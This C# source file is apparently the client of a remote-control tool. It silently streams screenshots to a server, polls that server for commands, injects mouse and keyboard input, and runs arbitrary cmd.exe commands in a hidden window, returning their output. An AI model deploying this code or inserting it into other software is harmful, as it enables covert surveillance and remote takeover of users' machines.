using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Windows.Forms;
using client.Helpers;
using client.Models;

namespace client.Services
{
    public class ScreenCapture
    {
        private readonly string      _connectionId;
        private readonly int         _intervalMs;
        private volatile bool        _running;
        private volatile int         _monitorIndex;
        private readonly object      _monitorLock = new object();
        private List<MonitorInfo>    _monitors;
        private Thread               _captureThread;
        private Thread               _commandThread;
        private readonly HttpClient  _client;

        public ScreenCapture(string connectionId, int intervalMs = 1000)
        {
            _connectionId = connectionId;
            _intervalMs   = intervalMs;
            _running      = false;
            _monitorIndex = 0;
            _client       = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
            _monitors     = GetMonitors();
        }

        public void Start()
        {
            if (_running) return;
            _running = true;
            SendMonitorList();
            _captureThread = new Thread(CaptureLoop) { IsBackground = true };
            _commandThread = new Thread(CommandLoop) { IsBackground = true };
            _captureThread.Start();
            _commandThread.Start();
        }

        public void Stop()
        {
            _running = false;
            _captureThread?.Join(TimeSpan.FromSeconds(5));
            _commandThread?.Join(TimeSpan.FromSeconds(5));
        }

        public void SetMonitor(int index)
        {
            lock (_monitorLock)
            {
                if (index >= 0 && index < _monitors.Count)
                    _monitorIndex = index;
            }
        }

        public static List<MonitorInfo> GetMonitors()
        {
            var monitors = new List<MonitorInfo>();
            int index = 0;
            foreach (Screen screen in Screen.AllScreens)
            {
                monitors.Add(new MonitorInfo
                {
                    Index     = index++,
                    Name      = screen.DeviceName,
                    X         = screen.Bounds.X,
                    Y         = screen.Bounds.Y,
                    Width     = screen.Bounds.Width,
                    Height    = screen.Bounds.Height,
                    IsPrimary = screen.Primary
                });
            }
            return monitors;
        }

        private void SendMonitorList()
        {
            lock (_monitorLock) { _monitors = GetMonitors(); }

            var items = new List<string>();
            foreach (var m in _monitors)
                items.Add(JsonSerializer.Serialize(m));

            string json = $"{{\"connectionId\":\"{_connectionId}\",\"monitors\":[{string.Join(",", items)}]}}";
            PostJson($"{Constants.API_BASE}/connections/{_connectionId}/monitors", json);
        }

        public static byte[] CaptureScreen(int quality, MonitorInfo monitor)
        {
            int x      = monitor?.X      ?? 0;
            int y      = monitor?.Y      ?? 0;
            int width  = monitor?.Width  ?? Screen.PrimaryScreen.Bounds.Width;
            int height = monitor?.Height ?? Screen.PrimaryScreen.Bounds.Height;

            using (var bmp = new Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format32bppArgb))
            using (var g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(x, y, 0, 0, new Size(width, height));

                var ci = new CURSORINFO { cbSize = Marshal.SizeOf(typeof(CURSORINFO)) };
                if (GetCursorInfo(ref ci) && (ci.flags & CURSOR_SHOWING) != 0)
                {
                    GetIconInfo(ci.hCursor, out ICONINFO ii);
                    DrawIconEx(g.GetHdc(), ci.ptScreenPos.x - x - (int)ii.xHotspot,
                               ci.ptScreenPos.y - y - (int)ii.yHotspot,
                               ci.hCursor, 0, 0, 0, IntPtr.Zero, DI_NORMAL);
                    g.ReleaseHdc();
                    if (ii.hbmMask  != IntPtr.Zero) DeleteObject(ii.hbmMask);
                    if (ii.hbmColor != IntPtr.Zero) DeleteObject(ii.hbmColor);
                }

                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)quality);
                var jpegCodec = GetJpegCodec();

                using (var ms = new MemoryStream())
                {
                    bmp.Save(ms, jpegCodec, encoderParams);
                    return ms.ToArray();
                }
            }
        }

        private static ImageCodecInfo GetJpegCodec()
        {
            foreach (var codec in ImageCodecInfo.GetImageEncoders())
                if (codec.MimeType == "image/jpeg") return codec;
            return null;
        }

        private void CaptureLoop()
        {
            while (_running)
            {
                try
                {
                    MonitorInfo monitor = null;
                    lock (_monitorLock)
                    {
                        int idx = _monitorIndex;
                        if (idx >= 0 && idx < _monitors.Count)
                            monitor = _monitors[idx];
                    }

                    byte[] imageData = CaptureScreen(40, monitor);
                    if (imageData != null && imageData.Length > 0)
                    {
                        string base64 = Convert.ToBase64String(imageData);
                        long   now    = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
                        string json   = $"{{\"connectionId\":\"{_connectionId}\"," +
                                        $"\"monitorIndex\":{_monitorIndex}," +
                                        $"\"timestamp\":{now}," +
                                        $"\"frame\":\"{base64}\"}}";
                        PostJson($"{Constants.API_BASE}/connections/{_connectionId}/screen", json);
                    }
                }
                catch { }

                Thread.Sleep(_intervalMs);
            }
        }

        private void CommandLoop()
        {
            while (_running)
            {
                CheckCommands();
                Thread.Sleep(50);
            }
        }

        private void CheckCommands()
        {
            try
            {
                string url      = $"{Constants.API_BASE}/connections/{_connectionId}/command";
                var    response = _client.GetAsync(url).GetAwaiter().GetResult();
                if (response.StatusCode != System.Net.HttpStatusCode.OK) return;

                string body = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                if (string.IsNullOrEmpty(body)) return;

                var commands = JsonSerializer.Deserialize<List<Dictionary<string, string>>>(body);
                if (commands == null) return;

                foreach (var cmd in commands)
                {
                    if (!cmd.TryGetValue("type", out string type)) continue;

                    if (type == "switchMonitor" && cmd.TryGetValue("monitorIndex", out string mi))
                    {
                        SetMonitor(int.Parse(mi));
                    }
                    else if (type == "mouseMove" || type == "mouseDown" || type == "mouseUp")
                    {
                        cmd.TryGetValue("x", out string sx); cmd.TryGetValue("y", out string sy);
                        cmd.TryGetValue("button", out string sb);
                        int px = int.TryParse(sx, out int _x) ? _x : 0;
                        int py = int.TryParse(sy, out int _y) ? _y : 0;
                        int pb = int.TryParse(sb, out int _b) ? _b : 0;
                        ExecuteMouseEvent(type, px, py, pb);
                    }
                    else if (type == "keyDown" || type == "keyUp")
                    {
                        cmd.TryGetValue("key",  out string key);
                        cmd.TryGetValue("code", out string code);
                        ExecuteKeyEvent(type, key ?? "", code ?? "");
                    }
                    else if (type == "shell")
                    {
                        cmd.TryGetValue("command",   out string command);
                        cmd.TryGetValue("commandId", out string commandId);
                        if (!string.IsNullOrEmpty(command))
                        {
                            string c = command, id = commandId;
                            new Thread(() => ExecuteShellCommand(c, id)) { IsBackground = true }.Start();
                        }
                    }
                }
            }
            catch { }
        }

        private void ExecuteMouseEvent(string type, int x, int y, int button)
        {
            MonitorInfo monitor = null;
            lock (_monitorLock)
            {
                int idx = _monitorIndex;
                if (idx >= 0 && idx < _monitors.Count)
                    monitor = _monitors[idx];
            }

            int absX = x + (monitor?.X ?? 0);
            int absY = y + (monitor?.Y ?? 0);

            int screenW = GetSystemMetrics(SM_CXVIRTUALSCREEN);
            int screenH = GetSystemMetrics(SM_CYVIRTUALSCREEN);
            int screenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
            int screenY = GetSystemMetrics(SM_YVIRTUALSCREEN);

            int normX = (int)(((absX - screenX) * 65535.0) / (screenW - 1));
            int normY = (int)(((absY - screenY) * 65535.0) / (screenH - 1));

            var input = new INPUT { type = INPUT_MOUSE };
            input.mi.dx = normX;
            input.mi.dy = normY;
            input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;

            if (type == "mouseMove")
                input.mi.dwFlags |= MOUSEEVENTF_MOVE;
            else if (type == "mouseDown")
            {
                input.mi.dwFlags |= MOUSEEVENTF_MOVE;
                input.mi.dwFlags |= (button == 2) ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_LEFTDOWN;
            }
            else if (type == "mouseUp")
                input.mi.dwFlags |= (button == 2) ? MOUSEEVENTF_RIGHTUP : MOUSEEVENTF_LEFTUP;

            SendInput(1, new[] { input }, Marshal.SizeOf(typeof(INPUT)));
        }

        private static void ExecuteKeyEvent(string type, string key, string code)
        {
            ushort vk = MapKeyCode(key, code);
            if (vk == 0) return;

            var input = new INPUT { type = INPUT_KEYBOARD };
            input.ki.wVk    = vk;
            input.ki.wScan  = (ushort)MapVirtualKey(vk, 0);
            input.ki.dwFlags = (type == "keyUp") ? KEYEVENTF_KEYUP : 0u;

            SendInput(1, new[] { input }, Marshal.SizeOf(typeof(INPUT)));
        }

        private void ExecuteShellCommand(string command, string commandId)
        {
            string output;
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/C " + command + " 2>&1")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };
                using (var proc = System.Diagnostics.Process.Start(psi))
                {
                    output = proc.StandardOutput.ReadToEnd();
                    proc.WaitForExit();
                    if (string.IsNullOrEmpty(output))
                        output = $"(no output, exit code: {proc.ExitCode})";
                }
            }
            catch (Exception ex)
            {
                output = $"Error: {ex.Message}";
            }

            string escaped = output
                .Replace("\\", "\\\\")
                .Replace("\"", "\\\"")
                .Replace("\n", "\\n")
                .Replace("\r", "\\r")
                .Replace("\t", "\\t");

            string json = $"{{\"output\":\"{escaped}\",\"commandId\":\"{commandId}\"}}";
            PostJson($"{Constants.API_BASE}/connections/{_connectionId}/shell", json);
        }

        private void PostJson(string url, string json)
        {
            try
            {
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                _client.PostAsync(url, content).GetAwaiter().GetResult();
            }
            catch { }
        }

        private static ushort MapKeyCode(string key, string code)
        {
            switch (code)
            {
                case "Backspace":    return VK_BACK;
                case "Tab":          return VK_TAB;
                case "Enter":
                case "NumpadEnter":  return VK_RETURN;
                case "ShiftLeft":
                case "ShiftRight":   return VK_SHIFT;
                case "ControlLeft":
                case "ControlRight": return VK_CONTROL;
                case "AltLeft":
                case "AltRight":     return VK_MENU;
                case "CapsLock":     return VK_CAPITAL;
                case "Escape":       return VK_ESCAPE;
                case "Space":        return VK_SPACE;
                case "PageUp":       return VK_PRIOR;
                case "PageDown":     return VK_NEXT;
                case "End":          return VK_END;
                case "Home":         return VK_HOME;
                case "ArrowLeft":    return VK_LEFT;
                case "ArrowUp":      return VK_UP;
                case "ArrowRight":   return VK_RIGHT;
                case "ArrowDown":    return VK_DOWN;
                case "Insert":       return VK_INSERT;
                case "Delete":       return VK_DELETE;
                case "MetaLeft":
                case "MetaRight":    return VK_LWIN;
                case "NumpadAdd":      return VK_ADD;
                case "NumpadSubtract": return VK_SUBTRACT;
                case "NumpadMultiply": return VK_MULTIPLY;
                case "NumpadDivide":   return VK_DIVIDE;
                case "NumpadDecimal":  return VK_DECIMAL;
                case "Semicolon":    return VK_OEM_1;
                case "Equal":        return VK_OEM_PLUS;
                case "Comma":        return VK_OEM_COMMA;
                case "Minus":        return VK_OEM_MINUS;
                case "Period":       return VK_OEM_PERIOD;
                case "Slash":        return VK_OEM_2;
                case "Backquote":    return VK_OEM_3;
                case "BracketLeft":  return VK_OEM_4;
                case "Backslash":    return VK_OEM_5;
                case "BracketRight": return VK_OEM_6;
                case "Quote":        return VK_OEM_7;
            }

            if (code.Length == 4 && code.StartsWith("Key"))
                return (ushort)code[3];
            if (code.Length == 6 && code.StartsWith("Digit"))
                return (ushort)code[5];
            if (code.Length == 7 && code.StartsWith("Numpad") && char.IsDigit(code[6]))
                return (ushort)(VK_NUMPAD0 + (code[6] - '0'));

            for (int i = 1; i <= 12; i++)
                if (code == "F" + i) return (ushort)(VK_F1 + i - 1);

            if (key.Length == 1)
            {
                short vk = VkKeyScan(key[0]);
                if (vk != -1) return (ushort)(vk & 0xFF);
            }

            return 0;
        }

        #region WinAPI

        private const int INPUT_MOUSE    = 0;
        private const int INPUT_KEYBOARD = 1;

        private const uint MOUSEEVENTF_MOVE        = 0x0001;
        private const uint MOUSEEVENTF_LEFTDOWN    = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP      = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN   = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP     = 0x0010;
        private const uint MOUSEEVENTF_ABSOLUTE    = 0x8000;
        private const uint MOUSEEVENTF_VIRTUALDESK = 0x4000;
        private const uint KEYEVENTF_KEYUP         = 0x0002;

        private const int SM_CXVIRTUALSCREEN = 78;
        private const int SM_CYVIRTUALSCREEN = 79;
        private const int SM_XVIRTUALSCREEN  = 76;
        private const int SM_YVIRTUALSCREEN  = 77;

        private const uint CURSOR_SHOWING = 0x00000001;
        private const uint DI_NORMAL      = 0x0003;

        private const ushort VK_BACK     = 0x08;
        private const ushort VK_TAB      = 0x09;
        private const ushort VK_RETURN   = 0x0D;
        private const ushort VK_SHIFT    = 0x10;
        private const ushort VK_CONTROL  = 0x11;
        private const ushort VK_MENU     = 0x12;
        private const ushort VK_CAPITAL  = 0x14;
        private const ushort VK_ESCAPE   = 0x1B;
        private const ushort VK_SPACE    = 0x20;
        private const ushort VK_PRIOR    = 0x21;
        private const ushort VK_NEXT     = 0x22;
        private const ushort VK_END      = 0x23;
        private const ushort VK_HOME     = 0x24;
        private const ushort VK_LEFT     = 0x25;
        private const ushort VK_UP       = 0x26;
        private const ushort VK_RIGHT    = 0x27;
        private const ushort VK_DOWN     = 0x28;
        private const ushort VK_INSERT   = 0x2D;
        private const ushort VK_DELETE   = 0x2E;
        private const ushort VK_LWIN     = 0x5B;
        private const ushort VK_NUMPAD0  = 0x60;
        private const ushort VK_F1       = 0x70;
        private const ushort VK_ADD      = 0x6B;
        private const ushort VK_SUBTRACT = 0x6D;
        private const ushort VK_MULTIPLY = 0x6A;
        private const ushort VK_DIVIDE   = 0x6F;
        private const ushort VK_DECIMAL  = 0x6E;
        private const ushort VK_OEM_1    = 0xBA;
        private const ushort VK_OEM_PLUS    = 0xBB;
        private const ushort VK_OEM_COMMA   = 0xBC;
        private const ushort VK_OEM_MINUS   = 0xBD;
        private const ushort VK_OEM_PERIOD  = 0xBE;
        private const ushort VK_OEM_2    = 0xBF;
        private const ushort VK_OEM_3    = 0xC0;
        private const ushort VK_OEM_4    = 0xDB;
        private const ushort VK_OEM_5    = 0xDC;
        private const ushort VK_OEM_6    = 0xDD;
        private const ushort VK_OEM_7    = 0xDE;

        [StructLayout(LayoutKind.Sequential)]
        private struct MOUSEINPUT
        {
            public int    dx, dy;
            public uint   mouseData, dwFlags, time;
            public IntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KEYBDINPUT
        {
            public ushort wVk, wScan;
            public uint   dwFlags, time;
            public IntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Explicit)]
        private struct INPUT
        {
            [FieldOffset(0)] public int type;
            [FieldOffset(4)] public MOUSEINPUT  mi;
            [FieldOffset(4)] public KEYBDINPUT  ki;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT { public int x, y; }

        [StructLayout(LayoutKind.Sequential)]
        private struct CURSORINFO
        {
            public int    cbSize, flags;
            public IntPtr hCursor;
            public POINT  ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct ICONINFO
        {
            public bool    fIcon;
            public uint    xHotspot, yHotspot;
            public IntPtr  hbmMask, hbmColor;
        }

        [DllImport("user32.dll")] private static extern uint SendInput(uint n, INPUT[] pInputs, int cbSize);
        [DllImport("user32.dll")] private static extern int  GetSystemMetrics(int nIndex);
        [DllImport("user32.dll")] private static extern bool GetCursorInfo(ref CURSORINFO pci);
        [DllImport("user32.dll")] private static extern bool GetIconInfo(IntPtr hIcon, out ICONINFO piconinfo);
        [DllImport("user32.dll")] private static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyHeight, uint istepIfAniCur, IntPtr hbrFlickerFreeDraw, uint diFlags);
        [DllImport("user32.dll")] private static extern uint MapVirtualKey(uint uCode, uint uMapType);
        [DllImport("user32.dll")] private static extern short VkKeyScan(char ch);
        [DllImport("gdi32.dll")]  private static extern bool DeleteObject(IntPtr hObject);

        #endregion
    }
}
